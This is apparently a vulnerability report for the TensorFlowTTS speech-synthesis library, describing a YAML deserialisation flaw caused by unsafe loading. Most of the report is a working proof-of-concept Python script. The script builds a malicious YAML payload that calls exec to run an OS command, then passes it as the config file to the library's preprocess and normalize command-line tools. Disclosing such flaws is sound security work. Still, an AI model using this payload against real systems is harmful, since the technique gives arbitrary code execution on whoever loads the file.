## ✍️ Description
TensorFlowTTS provides real-time state-of-the-art speech synthesis architectures such as Tacotron-2, Melgan, Multiband-Melgan, FastSpeech, FastSpeech2 based-on TensorFlow 2. With Tensorflow 2, we can speed-up training/inference progress, optimizer further by using fake-quantize aware and pruning, make TTS models can be run faster than real-time and be able to deploy on mobile devices or embedded systems.
* **Vulnerability discription**
Vulnerable to yaml deserilisation attack caused by unsafe loading.
## 🕵️‍♂️ Proof of Concept
* run the exploit code
```python
# exploit.py
import os
os.system('pip install TensorFlowTTS')
exploit = '''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
'''
os.system('rm exploit.yml exploit.yaml')
open('exploit.yml','w+').write(exploit)
print("\n\nexploiting preprocess in tts")
cmd = str('''tensorflow-tts-preprocess --rootdir ./ --outdir ./ --config exploit.yml ''')
os.system(cmd)
print("\n\nexploiting normalize in tts")
cmd1 = str('''tensorflow-tts-normalize --rootdir ./ --outdir ./ --config exploit.yml ''')
os.system(cmd1)
``` 
* [Video Link](https://cdn.discordapp.com/attachments/789769803770494996/791775352069816360/tts-2020-12-25_02.41.29.mkv)
